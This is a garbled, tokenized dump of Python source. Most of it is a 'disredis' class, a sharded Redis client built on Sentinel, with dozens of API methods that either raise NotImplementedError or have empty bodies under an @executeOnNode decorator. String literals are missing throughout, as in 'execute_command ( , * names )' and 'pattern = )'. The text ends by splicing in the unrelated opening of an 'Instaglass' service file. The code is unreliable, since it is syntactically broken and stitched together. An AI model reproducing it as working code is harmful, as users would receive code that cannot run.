self . nodes . append ( Node ( info [ "name" ] , info [ "ip" ] , info [ "port" ] ) ) \n 
\n 
~~ ~~ def get_master ( self , node ) : \n 
~~~ """\n        Returns the current master for a node. If it\'s different from the\n        passed in node, update our node list accordingly.\n        """ \n 
host , port = self . _execute_sentinel_command ( "get-master-addr-by-name" , \n 
node . name ) \n 
if host == node . host and port == node . port : \n 
~~~ return node \n 
~~ newNode = Node ( node . name , host , port ) \n 
self . nodes [ self . nodes . index ( node ) ] = newNode \n 
return newNode \n 
\n 
~~ def get_node_for_key ( self , key ) : \n 
~~~ """\n        Returns a node for the given key. Keys with {} in them will be sharded\n        based on only the string between the brackets. This is for future\n        compatibility with Redis Cluster (and is also a nice feature to have).\n        """ \n 
if "{" in key and "}" in key : \n 
~~~ key = key [ key . index ( "{" ) + 1 : key . index ( "}" ) ] \n 
~~ return self . nodes [ int ( sha1 ( key ) . hexdigest ( ) , 16 ) % len ( self . nodes ) ] \n 
\n 
# The remainder of this class is implementing the StrictRedis interface. \n 
~~ def set_response_callback ( self , command , callback ) : \n 
~~~ "Set a custom Response Callback" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def pipeline ( self , transaction = True , shard_hint = None ) : \n 
~~~ """\n        Return a new pipeline object that can queue multiple commands for\n        later execution. ``transaction`` indicates whether all commands\n        should be executed atomically. Apart from making a group of operations\n        atomic, pipelines are useful for reducing the back-and-forth overhead\n        between the client and server.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def transaction ( self , func , * watches , ** kwargs ) : \n 
~~~ """\n        Convenience method for executing the callable `func` as a transaction\n        while watching all keys specified in `watches`. The \'func\' callable\n        should expect a single arguement which is a Pipeline object.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ @ executeOnNode \n 
def lock ( self , name , timeout = None , sleep = 0.1 ) : \n 
~~~ """\n        Return a new Lock object using key ``name`` that mimics\n        the behavior of threading.Lock.\n\n        If specified, ``timeout`` indicates a maximum life for the lock.\n        By default, it will remain locked until release() is called.\n\n        ``sleep`` indicates the amount of time to sleep per loop iteration\n        when the lock is in blocking mode and another client is currently\n        holding the lock.\n        """ \n 
\n 
~~ @ executeOnNode # use the shard_hint for the key. \n 
def pubsub ( self , shard_hint = None ) : \n 
~~~ """\n        Return a Publish/Subscribe object. With this object, you can\n        subscribe to channels and listen for messages that get published to\n        them.\n        """ \n 
\n 
#### SERVER INFORMATION #### \n 
~~ def bgrewriteaof ( self ) : \n 
~~~ "Tell the Redis server to rewrite the AOF file from data in memory." \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def bgsave ( self ) : \n 
~~~ """\n        Tell the Redis server to save its data to disk.  Unlike save(),\n        this method is asynchronous and returns immediately.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def client_kill ( self , address ) : \n 
~~~ "Disconnects the client at ``address`` (ip:port)" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def client_list ( self ) : \n 
~~~ "Returns a list of currently connected clients" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def client_getname ( self ) : \n 
~~~ "Returns the current connection name" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def client_setname ( self , name ) : \n 
~~~ "Sets the current connection name" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def config_get ( self , pattern = "*" ) : \n 
~~~ "Return a dictionary of configuration based on the ``pattern``" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def config_set ( self , name , value ) : \n 
~~~ "Set config item ``name`` with ``value``" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def dbsize ( self ) : \n 
~~~ "Returns the number of keys in the current database" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def time ( self ) : \n 
~~~ """\n        Returns the server time as a 2-item tuple of ints:\n        (seconds since epoch, microseconds into this second).\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ @ executeOnNode \n 
def debug_object ( self , key ) : \n 
~~~ "Returns version specific metainformation about a give key" \n 
\n 
~~ def delete ( self , * names ) : \n 
~~~ "Delete one or more keys specified by ``names``" \n 
# TODO support this. \n 
return self . execute_command ( , * names ) \n 
~~ __delitem__ = delete \n 
\n 
def echo ( self , value ) : \n 
~~~ "Echo the string back from the server" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def flushall ( self ) : \n 
~~~ "Delete all keys in all databases on the current host" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def flushdb ( self ) : \n 
~~~ "Delete all keys in the current database" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def info ( self , section = None ) : \n 
~~~ """\n        Returns a dictionary containing information about the Redis server\n\n        The ``section`` option can be used to select a specific section\n        of information\n\n        The section option is not supported by older versions of Redis Server,\n        and will generate ResponseError\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def lastsave ( self ) : \n 
~~~ """\n        Return a Python datetime object representing the last time the\n        Redis database was saved to disk\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def object ( self , infotype , key ) : \n 
~~~ "Return the encoding, idletime, or refcount about the key" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def ping ( self ) : \n 
~~~ "Ping the Redis server" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def save ( self ) : \n 
~~~ """\n        Tell the Redis server to save its data to disk,\n        blocking until the save is complete\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def shutdown ( self ) : \n 
~~~ "Shutdown the server" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def slaveof ( self , host = None , port = None ) : \n 
~~~ """\n        Set the server to be a replicated slave of the instance identified\n        by the ``host`` and ``port``. If called without arguements, the\n        instance is promoted to a master instead.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
#### BASIC KEY COMMANDS #### \n 
~~ @ executeOnNode \n 
def append ( self , key , value ) : \n 
~~~ """\n        Appends the string ``value`` to the value at ``key``. If ``key``\n        doesn\'t already exist, create it with a value of ``value``.\n        Returns the new length of the value at ``key``.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def getrange ( self , key , start , end ) : \n 
~~~ """\n        Returns the substring of the string value stored at ``key``,\n        determined by the offsets ``start`` and ``end`` (both are inclusive)\n        """ \n 
\n 
~~ @ executeOnNode \n 
def bitcount ( self , key , start = None , end = None ) : \n 
~~~ """\n        Returns the count of set bits in the value of ``key``.  Optional\n        ``start`` and ``end`` paramaters indicate which bytes to consider\n        """ \n 
\n 
~~ def bitop ( self , operation , dest , * keys ) : \n 
~~~ """\n        Perform a bitwise operation using ``operation`` between ``keys`` and\n        store the result in ``dest``.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ @ executeOnNode \n 
def decr ( self , name , amount = 1 ) : \n 
~~~ """\n        Decrements the value of ``key`` by ``amount``.  If no key exists,\n        the value will be initialized as 0 - ``amount``\n        """ \n 
\n 
~~ @ executeOnNode \n 
def exists ( self , name ) : \n 
~~~ "Returns a boolean indicating whether key ``name`` exists" \n 
~~ __contains__ = exists \n 
\n 
@ executeOnNode \n 
def expire ( self , name , time ) : \n 
~~~ """\n        Set an expire flag on key ``name`` for ``time`` seconds. ``time``\n        can be represented by an integer or a Python timedelta object.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def expireat ( self , name , when ) : \n 
~~~ """\n        Set an expire flag on key ``name``. ``when`` can be represented\n        as an integer indicating unix time or a Python datetime object.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def get ( self , name ) : \n 
~~~ """\n        Return the value at key ``name``, or None if the key doesn\'t exist\n        """ \n 
\n 
~~ def __getitem__ ( self , name ) : \n 
~~~ """\n        Return the value at key ``name``, raises a KeyError if the key\n        doesn\'t exist.\n        """ \n 
value = self . get ( name ) \n 
if value : \n 
~~~ return value \n 
~~ raise KeyError ( name ) \n 
\n 
~~ @ executeOnNode \n 
def getbit ( self , name , offset ) : \n 
~~~ "Returns a boolean indicating the value of ``offset`` in ``name``" \n 
\n 
~~ @ executeOnNode \n 
def getset ( self , name , value ) : \n 
~~~ """\n        Set the value at key ``name`` to ``value`` if key doesn\'t exist\n        Return the value at key ``name`` atomically\n        """ \n 
\n 
~~ @ executeOnNode \n 
def incr ( self , name , amount = 1 ) : \n 
~~~ """\n        Increments the value of ``key`` by ``amount``.  If no key exists,\n        the value will be initialized as ``amount``\n        """ \n 
\n 
~~ def incrby ( self , name , amount = 1 ) : \n 
~~~ """\n        Increments the value of ``key`` by ``amount``.  If no key exists,\n        the value will be initialized as ``amount``\n        """ \n 
\n 
# An alias for ``incr()``, because it is already implemented \n 
# as INCRBY redis command. \n 
return self . incr ( name , amount ) \n 
\n 
~~ @ executeOnNode \n 
def incrbyfloat ( self , name , amount = 1.0 ) : \n 
~~~ """\n        Increments the value at key ``name`` by floating ``amount``.\n        If no key exists, the value will be initialized as ``amount``\n        """ \n 
\n 
~~ def keys ( self , pattern = ) : \n 
~~~ "Returns a list of keys matching ``pattern``" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def mget ( self , keys , * args ) : \n 
~~~ """\n        Returns a list of values ordered identically to ``keys``\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def mset ( self , mapping ) : \n 
~~~ "Sets each key in the ``mapping`` dict to its corresponding value" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def msetnx ( self , mapping ) : \n 
~~~ """\n        Sets each key in the ``mapping`` dict to its corresponding value if\n        none of the keys are already set\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ @ executeOnNode \n 
def move ( self , name , db ) : \n 
~~~ "Moves the key ``name`` to a different Redis database ``db``" \n 
\n 
~~ @ executeOnNode \n 
def persist ( self , name ) : \n 
~~~ "Removes an expiration on ``name``" \n 
\n 
~~ @ executeOnNode \n 
def pexpire ( self , name , time ) : \n 
~~~ """\n        Set an expire flag on key ``name`` for ``time`` milliseconds.\n        ``time`` can be represented by an integer or a Python timedelta\n        object.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def pexpireat ( self , name , when ) : \n 
~~~ """\n        Set an expire flag on key ``name``. ``when`` can be represented\n        as an integer representing unix time in milliseconds (unix time * 1000)\n        or a Python datetime object.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def psetex ( self , name , time_ms , value ) : \n 
~~~ """\n        Set the value of key ``name`` to ``value`` that expires in ``time_ms``\n        milliseconds. ``time_ms`` can be represented by an integer or a Python\n        timedelta object\n        """ \n 
\n 
~~ @ executeOnNode \n 
def pttl ( self , name ) : \n 
~~~ "Returns the number of milliseconds until the key ``name`` will expire" \n 
\n 
~~ def randomkey ( self ) : \n 
~~~ "Returns the name of a random key" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def rename ( self , src , dst ) : \n 
~~~ """\n        Rename key ``src`` to ``dst``\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def renamenx ( self , src , dst ) : \n 
~~~ "Rename key ``src`` to ``dst`` if ``dst`` doesn\'t already exist" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ @ executeOnNode \n 
def set ( self , name , value , ex = None , px = None , nx = False , xx = False ) : \n 
~~~ """\n        Set the value at key ``name`` to ``value``\n\n        ``ex`` sets an expire flag on key ``name`` for ``ex`` seconds.\n\n        ``px`` sets an expire flag on key ``name`` for ``px`` milliseconds.\n\n        ``nx`` if set to True, set the value at key ``name`` to ``value`` if it\n            does not already exist.\n\n        ``xx`` if set to True, set the value at key ``name`` to ``value`` if it\n            already exists.\n        """ \n 
~~ __setitem__ = set \n 
\n 
@ executeOnNode \n 
def setbit ( self , name , offset , value ) : \n 
~~~ """\n        Flag the ``offset`` in ``name`` as ``value``. Returns a boolean\n        indicating the previous value of ``offset``.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def setex ( self , name , time , value ) : \n 
~~~ """\n        Set the value of key ``name`` to ``value`` that expires in ``time``\n        seconds. ``time`` can be represented by an integer or a Python\n        timedelta object.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def setnx ( self , name , value ) : \n 
~~~ "Set the value of key ``name`` to ``value`` if key doesn\'t exist" \n 
\n 
~~ @ executeOnNode \n 
def setrange ( self , name , offset , value ) : \n 
~~~ """\n        Overwrite bytes in the value of ``name`` starting at ``offset`` with\n        ``value``. If ``offset`` plus the length of ``value`` exceeds the\n        length of the original value, the new value will be larger than before.\n        If ``offset`` exceeds the length of the original value, null bytes\n        will be used to pad between the end of the previous value and the start\n        of what\'s being injected.\n\n        Returns the length of the new string.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def strlen ( self , name ) : \n 
~~~ "Return the number of bytes stored in the value of ``name``" \n 
\n 
~~ @ executeOnNode \n 
def substr ( self , name , start , end = - 1 ) : \n 
~~~ """\n        Return a substring of the string at key ``name``. ``start`` and ``end``\n        are 0-based integers specifying the portion of the string to return.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def ttl ( self , name ) : \n 
~~~ "Returns the number of seconds until the key ``name`` will expire" \n 
\n 
~~ @ executeOnNode \n 
def type ( self , name ) : \n 
~~~ "Returns the type of key ``name``" \n 
\n 
#### LIST COMMANDS #### \n 
~~ def blpop ( self , keys , timeout = 0 ) : \n 
~~~ """\n        LPOP a value off of the first non-empty list\n        named in the ``keys`` list.\n\n        If none of the lists in ``keys`` has a value to LPOP, then block\n        for ``timeout`` seconds, or until a value gets pushed on to one\n        of the lists.\n\n        If timeout is 0, then block indefinitely.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def brpop ( self , keys , timeout = 0 ) : \n 
~~~ """\n        RPOP a value off of the first non-empty list\n        named in the ``keys`` list.\n\n        If none of the lists in ``keys`` has a value to LPOP, then block\n        for ``timeout`` seconds, or until a value gets pushed on to one\n        of the lists.\n\n        If timeout is 0, then block indefinitely.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def brpoplpush ( self , src , dst , timeout = 0 ) : \n 
~~~ """\n        Pop a value off the tail of ``src``, push it on the head of ``dst``\n        and then return it.\n\n        This command blocks until a value is in ``src`` or until ``timeout``\n        seconds elapse, whichever is first. A ``timeout`` value of 0 blocks\n        forever.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ @ executeOnNode \n 
def lindex ( self , name , index ) : \n 
~~~ """\n        Return the item from list ``name`` at position ``index``\n\n        Negative indexes are supported and will return an item at the\n        end of the list\n        """ \n 
\n 
~~ @ executeOnNode \n 
def linsert ( self , name , where , refvalue , value ) : \n 
~~~ """\n        Insert ``value`` in list ``name`` either immediately before or after\n        [``where``] ``refvalue``\n\n        Returns the new length of the list on success or -1 if ``refvalue``\n        is not in the list.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def llen ( self , name ) : \n 
~~~ "Return the length of the list ``name``" \n 
\n 
~~ @ executeOnNode \n 
def lpop ( self , name ) : \n 
~~~ "Remove and return the first item of the list ``name``" \n 
\n 
~~ @ executeOnNode \n 
def lpush ( self , name , * values ) : \n 
~~~ "Push ``values`` onto the head of the list ``name``" \n 
\n 
~~ @ executeOnNode \n 
def lpushx ( self , name , value ) : \n 
~~~ "Push ``value`` onto the head of the list ``name`` if ``name`` exists" \n 
\n 
~~ @ executeOnNode \n 
def lrange ( self , name , start , end ) : \n 
~~~ """\n        Return a slice of the list ``name`` between\n        position ``start`` and ``end``\n\n        ``start`` and ``end`` can be negative numbers just like\n        Python slicing notation\n        """ \n 
\n 
~~ @ executeOnNode \n 
def lrem ( self , name , count , value ) : \n 
~~~ """\n        Remove the first ``count`` occurrences of elements equal to ``value``\n        from the list stored at ``name``.\n\n        The count argument influences the operation in the following ways:\n            count > 0: Remove elements equal to value moving from head to tail.\n            count < 0: Remove elements equal to value moving from tail to head.\n            count = 0: Remove all elements equal to value.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def lset ( self , name , index , value ) : \n 
~~~ "Set ``position`` of list ``name`` to ``value``" \n 
\n 
~~ @ executeOnNode \n 
def ltrim ( self , name , start , end ) : \n 
~~~ """\n        Trim the list ``name``, removing all values not within the slice\n        between ``start`` and ``end``\n\n        ``start`` and ``end`` can be negative numbers just like\n        Python slicing notation\n        """ \n 
\n 
~~ @ executeOnNode \n 
def rpop ( self , name ) : \n 
~~~ "Remove and return the last item of the list ``name``" \n 
\n 
~~ def rpoplpush ( self , src , dst ) : \n 
~~~ """\n        RPOP a value off of the ``src`` list and atomically LPUSH it\n        on to the ``dst`` list.  Returns the value.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ @ executeOnNode \n 
def rpush ( self , name , * values ) : \n 
~~~ "Push ``values`` onto the tail of the list ``name``" \n 
\n 
~~ @ executeOnNode \n 
def rpushx ( self , name , value ) : \n 
~~~ "Push ``value`` onto the tail of the list ``name`` if ``name`` exists" \n 
\n 
~~ @ executeOnNode \n 
def sort ( self , name , start = None , num = None , by = None , get = None , \n 
desc = False , alpha = False , store = None , groups = False ) : \n 
~~~ """\n        Sort and return the list, set or sorted set at ``name``.\n\n        ``start`` and ``num`` allow for paging through the sorted data\n\n        ``by`` allows using an external key to weight and sort the items.\n            Use an "*" to indicate where in the key the item value is located\n\n        ``get`` allows for returning items from external keys rather than the\n            sorted data itself.  Use an "*" to indicate where int he key\n            the item value is located\n\n        ``desc`` allows for reversing the sort\n\n        ``alpha`` allows for sorting lexicographically rather than numerically\n\n        ``store`` allows for storing the result of the sort into\n            the key ``store``\n\n        ``groups`` if set to True and if ``get`` contains at least two\n            elements, sort will return a list of tuples, each containing the\n            values fetched from the arguments to ``get``.\n\n        """ \n 
\n 
#### SET COMMANDS #### \n 
~~ @ executeOnNode \n 
def sadd ( self , name , * values ) : \n 
~~~ "Add ``value(s)`` to set ``name``" \n 
\n 
~~ @ executeOnNode \n 
def scard ( self , name ) : \n 
~~~ "Return the number of elements in set ``name``" \n 
\n 
~~ def sdiff ( self , keys , * args ) : \n 
~~~ "Return the difference of sets specified by ``keys``" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def sdiffstore ( self , dest , keys , * args ) : \n 
~~~ """\n        Store the difference of sets specified by ``keys`` into a new\n        set named ``dest``.  Returns the number of keys in the new set.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def sinter ( self , keys , * args ) : \n 
~~~ "Return the intersection of sets specified by ``keys``" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def sinterstore ( self , dest , keys , * args ) : \n 
~~~ """\n        Store the intersection of sets specified by ``keys`` into a new\n        set named ``dest``.  Returns the number of keys in the new set.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ @ executeOnNode \n 
def sismember ( self , name , value ) : \n 
~~~ "Return a boolean indicating if ``value`` is a member of set ``name``" \n 
\n 
~~ @ executeOnNode \n 
def smembers ( self , name ) : \n 
~~~ "Return all members of the set ``name``" \n 
\n 
~~ def smove ( self , src , dst , value ) : \n 
~~~ "Move ``value`` from set ``src`` to set ``dst`` atomically" \n 
return self . execute_command ( , src , dst , value ) \n 
\n 
~~ @ executeOnNode \n 
def spop ( self , name ) : \n 
~~~ "Remove and return a random member of set ``name``" \n 
\n 
~~ @ executeOnNode \n 
def srandmember ( self , name , number = None ) : \n 
~~~ """\n        If ``number`` is None, returns a random member of set ``name``.\n\n        If ``number`` is supplied, returns a list of ``number`` random\n        memebers of set ``name``. Note this is only available when running\n        Redis 2.6+.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def srem ( self , name , * values ) : \n 
~~~ "Remove ``values`` from set ``name``" \n 
\n 
~~ def sunion ( self , keys , * args ) : \n 
~~~ "Return the union of sets specifiued by ``keys``" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def sunionstore ( self , dest , keys , * args ) : \n 
~~~ """\n        Store the union of sets specified by ``keys`` into a new\n        set named ``dest``.  Returns the number of keys in the new set.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
#### SORTED SET COMMANDS #### \n 
~~ @ executeOnNode \n 
def zadd ( self , name , * args , ** kwargs ) : \n 
~~~ """\n        Set any number of score, element-name pairs to the key ``name``. Pairs\n        can be specified in two ways:\n\n        As *args, in the form of: score1, name1, score2, name2, ...\n        or as **kwargs, in the form of: name1=score1, name2=score2, ...\n\n        The following example would add four values to the \'my-key\' key:\n        redis.zadd(\'my-key\', 1.1, \'name1\', 2.2, \'name2\', name3=3.3, name4=4.4)\n        """ \n 
\n 
~~ @ executeOnNode \n 
def zcard ( self , name ) : \n 
~~~ "Return the number of elements in the sorted set ``name``" \n 
\n 
~~ @ executeOnNode \n 
def zcount ( self , name , min , max ) : \n 
~~~ """\n        """ \n 
\n 
~~ @ executeOnNode \n 
def zincrby ( self , name , value , amount = 1 ) : \n 
~~~ "Increment the score of ``value`` in sorted set ``name`` by ``amount``" \n 
\n 
~~ def zinterstore ( self , dest , keys , aggregate = None ) : \n 
~~~ """\n        Intersect multiple sorted sets specified by ``keys`` into\n        a new sorted set, ``dest``. Scores in the destination will be\n        aggregated based on the ``aggregate``, or SUM if none is provided.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ @ executeOnNode \n 
def zrange ( self , name , start , end , desc = False , withscores = False , \n 
score_cast_func = float ) : \n 
~~~ """\n        Return a range of values from sorted set ``name`` between\n        ``start`` and ``end`` sorted in ascending order.\n\n        ``start`` and ``end`` can be negative, indicating the end of the range.\n\n        ``desc`` a boolean indicating whether to sort the results descendingly\n\n        ``withscores`` indicates to return the scores along with the values.\n        The return type is a list of (value, score) pairs\n\n        ``score_cast_func`` a callable used to cast the score return value\n        """ \n 
\n 
~~ @ executeOnNode \n 
def zrangebyscore ( self , name , min , max , start = None , num = None , \n 
withscores = False , score_cast_func = float ) : \n 
~~~ """\n        Return a range of values from the sorted set ``name`` with scores\n        between ``min`` and ``max``.\n\n        If ``start`` and ``num`` are specified, then return a slice\n        of the range.\n\n        ``withscores`` indicates to return the scores along with the values.\n        The return type is a list of (value, score) pairs\n\n        `score_cast_func`` a callable used to cast the score return value\n        """ \n 
\n 
~~ @ executeOnNode \n 
def zrank ( self , name , value ) : \n 
~~~ """\n        Returns a 0-based value indicating the rank of ``value`` in sorted set\n        ``name``\n        """ \n 
\n 
~~ @ executeOnNode \n 
def zrem ( self , name , * values ) : \n 
~~~ "Remove member ``values`` from sorted set ``name``" \n 
\n 
~~ @ executeOnNode \n 
def zremrangebyrank ( self , name , min , max ) : \n 
~~~ """\n        Remove all elements in the sorted set ``name`` with ranks between\n        ``min`` and ``max``. Values are 0-based, ordered from smallest score\n        to largest. Values can be negative indicating the highest scores.\n        Returns the number of elements removed\n        """ \n 
\n 
~~ @ executeOnNode \n 
def zremrangebyscore ( self , name , min , max ) : \n 
~~~ """\n        Remove all elements in the sorted set ``name`` with scores\n        between ``min`` and ``max``. Returns the number of elements removed.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def zrevrange ( self , name , start , num , withscores = False , \n 
score_cast_func = float ) : \n 
~~~ """\n        Return a range of values from sorted set ``name`` between\n        ``start`` and ``num`` sorted in descending order.\n\n        ``start`` and ``num`` can be negative, indicating the end of the range.\n\n        ``withscores`` indicates to return the scores along with the values\n        The return type is a list of (value, score) pairs\n\n        ``score_cast_func`` a callable used to cast the score return value\n        """ \n 
\n 
~~ @ executeOnNode \n 
def zrevrangebyscore ( self , name , max , min , start = None , num = None , \n 
withscores = False , score_cast_func = float ) : \n 
~~~ """\n        Return a range of values from the sorted set ``name`` with scores\n        between ``min`` and ``max`` in descending order.\n\n        If ``start`` and ``num`` are specified, then return a slice\n        of the range.\n\n        ``withscores`` indicates to return the scores along with the values.\n        The return type is a list of (value, score) pairs\n\n        ``score_cast_func`` a callable used to cast the score return value\n        """ \n 
\n 
~~ @ executeOnNode \n 
def zrevrank ( self , name , value ) : \n 
~~~ """\n        Returns a 0-based value indicating the descending rank of\n        ``value`` in sorted set ``name``\n        """ \n 
\n 
~~ @ executeOnNode \n 
def zscore ( self , name , value ) : \n 
~~~ "Return the score of element ``value`` in sorted set ``name``" \n 
\n 
~~ def zunionstore ( self , dest , keys , aggregate = None ) : \n 
~~~ """\n        Union multiple sorted sets specified by ``keys`` into\n        a new sorted set, ``dest``. Scores in the destination will be\n        aggregated based on the ``aggregate``, or SUM if none is provided.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
#### HASH COMMANDS #### \n 
~~ @ executeOnNode \n 
def hdel ( self , name , * keys ) : \n 
~~~ "Delete ``keys`` from hash ``name``" \n 
\n 
~~ @ executeOnNode \n 
def hexists ( self , name , key ) : \n 
~~~ "Returns a boolean indicating if ``key`` exists within hash ``name``" \n 
\n 
~~ @ executeOnNode \n 
def hget ( self , name , key ) : \n 
~~~ "Return the value of ``key`` within the hash ``name``" \n 
\n 
~~ @ executeOnNode \n 
def hgetall ( self , name ) : \n 
~~~ "Return a Python dict of the hash\'s name/value pairs" \n 
\n 
~~ @ executeOnNode \n 
def hincrby ( self , name , key , amount = 1 ) : \n 
~~~ "Increment the value of ``key`` in hash ``name`` by ``amount``" \n 
\n 
~~ @ executeOnNode \n 
def hincrbyfloat ( self , name , key , amount = 1.0 ) : \n 
~~~ """\n        Increment the value of ``key`` in hash ``name`` by floating ``amount``\n        """ \n 
\n 
~~ @ executeOnNode \n 
def hkeys ( self , name ) : \n 
~~~ "Return the list of keys within hash ``name``" \n 
\n 
~~ @ executeOnNode \n 
def hlen ( self , name ) : \n 
~~~ "Return the number of elements in hash ``name``" \n 
\n 
~~ @ executeOnNode \n 
def hset ( self , name , key , value ) : \n 
~~~ """\n        Set ``key`` to ``value`` within hash ``name``\n        Returns 1 if HSET created a new field, otherwise 0\n        """ \n 
\n 
~~ @ executeOnNode \n 
def hsetnx ( self , name , key , value ) : \n 
~~~ """\n        Set ``key`` to ``value`` within hash ``name`` if ``key`` does not\n        exist.  Returns 1 if HSETNX created a field, otherwise 0.\n        """ \n 
\n 
~~ @ executeOnNode \n 
def hmset ( self , name , mapping ) : \n 
~~~ """\n        Sets each key in the ``mapping`` dict to its corresponding value\n        in the hash ``name``\n        """ \n 
\n 
~~ @ executeOnNode \n 
def hmget ( self , name , keys , * args ) : \n 
~~~ "Returns a list of values ordered identically to ``keys``" \n 
\n 
~~ @ executeOnNode \n 
def hvals ( self , name ) : \n 
~~~ "Return the list of values within hash ``name``" \n 
\n 
~~ def publish ( self , channel , message ) : \n 
~~~ """\n        Publish ``message`` on ``channel``.\n        Returns the number of subscribers the message was delivered to.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def eval ( self , script , numkeys , * keys_and_args ) : \n 
~~~ """\n        Execute the LUA ``script``, specifying the ``numkeys`` the script\n        will touch and the key names and argument values in ``keys_and_args``.\n        Returns the result of the script.\n\n        In practice, use the object returned by ``register_script``. This\n        function exists purely for Redis API completion.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def evalsha ( self , sha , numkeys , * keys_and_args ) : \n 
~~~ """\n        Use the ``sha`` to execute a LUA script already registered via EVAL\n        or SCRIPT LOAD. Specify the ``numkeys`` the script will touch and the\n        key names and argument values in ``keys_and_args``. Returns the result\n        of the script.\n\n        In practice, use the object returned by ``register_script``. This\n        function exists purely for Redis API completion.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def script_exists ( self , * args ) : \n 
~~~ """\n        Check if a script exists in the script cache by specifying the SHAs of\n        each script as ``args``. Returns a list of boolean values indicating if\n        if each already script exists in the cache.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def script_flush ( self ) : \n 
~~~ "Flush all scripts from the script cache" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def script_kill ( self ) : \n 
~~~ "Kill the currently executing LUA script" \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def script_load ( self , script ) : \n 
~~~ "Load a LUA ``script`` into the script cache. Returns the SHA." \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
\n 
~~ def register_script ( self , script ) : \n 
~~~ """\n        Register a LUA ``script`` specifying the ``keys`` it will touch.\n        Returns a Script object that is callable and hides the complexity of\n        deal with scripts, keys, and shas. This is the preferred way to work\n        with LUA scripts.\n        """ \n 
raise NotImplementedError ( "Not supported for disredis." ) \n 
#!/usr/bin/python \n 
\n 
# Copyright (C) 2013 Gerwin Sturm, FoldedSoft e.U. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#      http://www.apache.org/licenses/LICENSE-2.0# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ """Methods for Instaglass service""" \n 
\n 
__author__ = \n 
\n 
from service import upload \n 
from utils import base_url \n 
\n 
import logging \n 
import Image \n 
import ImageOps \n 
import cStringIO \n 
\n 
